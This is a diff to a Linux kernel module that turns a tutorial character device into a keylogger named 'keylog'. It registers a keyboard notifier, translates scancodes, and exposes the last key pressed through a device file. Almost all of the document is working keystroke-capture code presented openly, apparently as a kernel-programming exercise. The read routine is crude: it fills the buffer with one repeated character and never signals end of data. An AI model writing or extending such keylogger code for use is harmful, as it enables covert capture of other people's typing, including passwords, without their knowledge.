@@ -1,5 +1,4 @@
-/* Creates a read-only char device that says how many times it has been
- * read.
+/* keylog - Creates a device  file that outputs past keyboard input
  */
 #include <linux/kernel.h>
 #include <linux/module.h>
@@ -8,6 +7,7 @@
 #include <linux/cdev.h>
 #include <linux/kdev_t.h>
 #include <linux/version.h>
+#include <linux/keyboard.h>
 
 #include <asm/uaccess.h>
 
@@ -22,10 +22,9 @@ static struct cdev c_dev;
 
 static int Device_Open = 0;
 
-static char msg[BUF_LEN];
-static char *msg_ptr;
+static char prev_key;
 
-
+// Fill callback structs
 static int device_open(struct inode *, struct file *);
 static int device_release(struct inode *, struct file *);
 static ssize_t device_read(struct file *, char *, size_t, loff_t *);
@@ -36,10 +35,23 @@ static struct file_operations fops = {
     .open = device_open,
     .release = device_release,
 };
+int key_notify(struct notifier_block *nblock, unsigned long code, void *_param);
+static struct notifier_block nb = {
+    .notifier_call = key_notify
+};
+
+// Map keycodes to keys, subtract 1 from keycode before indexing (Esc = 1)
+// 16 per line!
+static char scanmap[55] = {
+    'E', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', 'B', 'T', 'q', 'w',
+    'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n', 'C', 'a', 's', 'd', 'f',
+    'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 'L', 'z', 'x', 'c', 'v', 'b', 'n', 'm',
+    ',', '.', '/', 'R', '?', 'A', ' '
+};
 
 /* Called when module is loaded.
  */
-int init_module(void)
+static int __init keylog_init(void)
 {
     // Register device with kernel, major number dynamically allocated
     int res = alloc_chrdev_region(&dev, 0, DEVICE_CNT, DEV_NAME);
@@ -68,7 +80,8 @@ int init_module(void)
         goto error3;
     }
 
-    printk(KERN_INFO "chardev: registered %d device\n", MAJOR(dev));
+    // Register keyboard notifier
+    register_keyboard_notifier(&nb);
     return 0;
 error3:
     device_destroy(cl, dev);
@@ -81,12 +94,34 @@ error1:
 
 /* Called when module is unloaded.
  */
-void cleanup_module(void)
+static void __exit keylog_exit(void)
 {
     cdev_del(&c_dev);
     device_destroy(cl, dev);
     class_destroy(cl);
     unregister_chrdev_region(dev, DEVICE_CNT);
+    unregister_keyboard_notifier(&nb);
+}
+
+/* Called from notify block when a key is pressed.
+ */
+int key_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
+    struct keyboard_notifier_param *param = _param;
+    struct vc_data *vc = param->vc;
+
+    int ret = NOTIFY_OK;
+
+    if (code == KBD_KEYCODE) {
+        if (param->down) {
+            if (param->value >= 55) {
+                prev_key = '?';
+            } else {
+                prev_key = scanmap[param->value - 1];
+            }
+        }
+    }
+
+    return ret;
 }
 
 /* Called when a process tries to open the device file.
@@ -94,14 +129,10 @@ void cleanup_module(void)
  */
 static int device_open(struct inode *inode, struct file *file)
 {
-    static int counter = 0;
-
     if (Device_Open)
         return -EBUSY;
-
     Device_Open++;
-    sprintf(msg, "I already told you %d times chardev world!\n", counter++);
-    msg_ptr = msg;
+
     try_module_get(THIS_MODULE);
 
     return 0;
@@ -125,17 +156,10 @@ static ssize_t device_read(struct file *file_ptr, char *buffer,
                            size_t length, loff_t *offset)
 {
     int bytes_read = 0;
-    if (*msg_ptr == 0)
-        return 0;
 
-    while (length && *msg_ptr) {
-        /* Buffer is in the user data segment, so "*" assignment won't work.
-         * We have to use put_user which copies data from the kernel data
-         * segment to the user data segment.
-         */
-        put_user(*(msg_ptr++), buffer++);
-
-        length--;
+    while (length) {
+        // Copy from kernel data segment to user data segment
+        put_user(prev_key, buffer++);
         bytes_read++;
     }
 
@@ -152,5 +176,8 @@ static ssize_t device_write(struct file* file_ptr, const char *buff,
     return -EINVAL;
 }
 
+module_init(keylog_init);
+module_exit(keylog_exit);
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Christopher Chin");
+MODULE_DESCRIPTION("Prints keyboard events");
